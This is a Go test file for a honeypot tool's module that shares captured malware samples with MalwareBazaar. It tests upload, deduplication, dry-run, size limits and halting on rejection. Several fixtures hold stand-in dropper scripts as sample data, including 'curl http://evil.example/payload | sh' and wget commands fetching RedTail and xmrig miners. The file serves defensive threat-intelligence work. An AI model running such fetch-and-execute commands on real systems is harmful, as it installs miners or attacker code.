package bazaar

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"
)

// memRecorder is an in-memory UploadRecorder for tests. The real
// implementation lives in cmd/shardlure/share.go and wraps the
// sqlite store; replicating that here would re-test sqlite, not
// the Share logic.
type memRecorder struct {
	mu      sync.Mutex
	seen    map[string]bool
	records []struct {
		sha, status, url string
		at               time.Time
	}
}

func newMemRecorder() *memRecorder { return &memRecorder{seen: map[string]bool{}} }

func (m *memRecorder) BazaarUploadRecorded(sha string) (bool, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.seen[sha], nil
}

func (m *memRecorder) RecordBazaarUpload(sha, status, url string, at time.Time) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.seen[sha] = true
	m.records = append(m.records, struct {
		sha, status, url string
		at               time.Time
	}{sha, status, url, at})
	return nil
}

// TestShareUploadsAndRecords verifies the full happy path: candidate
// is on disk, MalwareBazaar returns inserted, the recorder is told,
// and the next call short-circuits via dedup.
func TestShareUploadsAndRecords(t *testing.T) {
	dir := t.TempDir()
	samplePath := filepath.Join(dir, "sample.bin")
	// A RedTail dropper script fetched in-session: passes Vet (fresh, malware
	// family, fetched origin). The test is about the upload/dedup pipeline, so
	// the candidate must clear the submission-policy gate.
	if err := os.WriteFile(samplePath, []byte("#!/bin/bash\n# redtail miner installer\ncd /tmp && wget http://x/redtail\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	var calls int
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	c := []Candidate{{
		SHA256:     "aa11bb22cc33",
		LocalPath:  samplePath,
		SizeBytes:  70,
		CreatedAt:  time.Now(),
		Origin:     "cowrie_download",
		ObservedAt: time.Now(),
	}}
	opts := Options{
		APIKey:    "k",
		Endpoint:  srv.URL,
		ExtraTags: []string{"shardlure", "honeypot"},
		MaxBytes:  1 << 20,
		RateLimit: time.Millisecond, // don't slow the test
	}
	uploaded, skipped, err := Share(context.Background(), rec, c, opts)
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 1 || skipped != 0 {
		t.Errorf("first run: want (1,0), got (%d,%d)", uploaded, skipped)
	}
	if len(rec.records) != 1 || rec.records[0].status != "inserted" {
		t.Errorf("recorder: want 1 inserted, got %+v", rec.records)
	}

	// Second run: candidate is the same, should be skipped without
	// hitting the network.
	prevCalls := calls
	uploaded, skipped, err = Share(context.Background(), rec, c, opts)
	if err != nil {
		t.Fatalf("Share #2: %v", err)
	}
	if uploaded != 0 || skipped != 1 {
		t.Errorf("second run: want (0,1), got (%d,%d)", uploaded, skipped)
	}
	if calls != prevCalls {
		t.Errorf("dedup failed: network was hit again")
	}
}

// TestShareDryRunSkipsNetwork ensures --dry-run never hits the
// endpoint and never records. Critical: a dry-run that uploaded by
// accident would be a serious bug since the sample becomes public.
func TestShareDryRunSkipsNetwork(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "x")
	// Write a plausible shell dropper (>= minSampleBytes=64 bytes).
	_ = os.WriteFile(p, []byte("#!/bin/sh\ncurl http://evil.example/payload | sh\n"+
		"# padding to hit 64 bytes for Vet minimum size gate xxxxxxxxxxxx\n"), 0o600)

	hit := false
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hit = true
		_, _ = w.Write([]byte(`{"query_status": "inserted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	cand := Candidate{
		SHA256:     "abc",
		LocalPath:  p,
		SizeBytes:  128,
		Origin:     "cowrie_download",
		ObservedAt: time.Now().Add(-1 * time.Hour),
		CreatedAt:  time.Now(),
	}
	var sawDryRun bool
	uploaded, _, err := Share(context.Background(), rec, []Candidate{cand}, Options{
		Endpoint:  srv.URL,
		MaxBytes:  1 << 20,
		DryRun:    true,
		RateLimit: time.Millisecond,
		OnProgress: func(_ Candidate, _ Classification, r *Result, _ error) {
			if r != nil && r.Status == "dry-run" {
				sawDryRun = true
			}
		},
	})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if hit {
		t.Errorf("dry-run hit the network endpoint")
	}
	if uploaded != 0 {
		t.Errorf("dry-run reported uploads: %d", uploaded)
	}
	if len(rec.records) != 0 {
		t.Errorf("dry-run recorded: %v", rec.records)
	}
	if !sawDryRun {
		t.Errorf("candidate never reached the dry-run gate (rejected earlier)")
	}
}

// TestShareSkipsOversize asserts the size cap is honoured client-side
// so we never embarrass ourselves by sending a 4 GB cowrie sftp blob
// to abuse.ch.
func TestShareSkipsOversize(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "big")
	_ = os.WriteFile(p, []byte("x"), 0o600)

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("oversized sample reached the endpoint")
	}))
	defer srv.Close()

	rec := newMemRecorder()
	uploaded, skipped, err := Share(context.Background(), rec, []Candidate{{
		SHA256: "abc", LocalPath: p, SizeBytes: 1024 * 1024 * 1024, // 1 GiB
		CreatedAt: time.Now(),
	}}, Options{APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond})
	if err != nil {
		t.Fatalf("Share: %v", err)
	}
	if uploaded != 0 || skipped != 1 {
		t.Errorf("want (0,1), got (%d,%d)", uploaded, skipped)
	}
}

// TestShareFatalRejectionStops verifies that a "user_blacklisted"
// response halts the run instead of continuing through the batch
// (which would amount to ddosing the abuse.ch endpoint).
func TestShareFatalRejectionStops(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "x")
	// Must clear Vet so it reaches the network (that's what this test checks).
	_ = os.WriteFile(p, []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://x/xmrig\n"), 0o600)

	calls := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		_, _ = w.Write([]byte(`{"query_status": "user_blacklisted"}`))
	}))
	defer srv.Close()

	rec := newMemRecorder()
	fresh := time.Now()
	cands := []Candidate{
		{SHA256: "a", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		{SHA256: "b", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
		{SHA256: "c", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
	}
	_, _, err := Share(context.Background(), rec, cands, Options{
		APIKey:    "k",
		Endpoint:  srv.URL,
		MaxBytes:  1 << 20,
		RateLimit: time.Millisecond,
	})
	if err == nil {
		t.Fatalf("expected fatal error for user_blacklisted")
	}
	if calls != 1 {
		t.Errorf("want 1 call before halt, got %d", calls)
	}
}

// TestShareMissingAPIKey checks the early-exit guard.
func TestShareMissingAPIKey(t *testing.T) {
	_, _, err := Share(context.Background(), newMemRecorder(), []Candidate{{SHA256: "a", LocalPath: "/dev/null", SizeBytes: 1}}, Options{})
	if err != ErrMissingAPIKey {
		t.Fatalf("want ErrMissingAPIKey, got %v", err)
	}
}
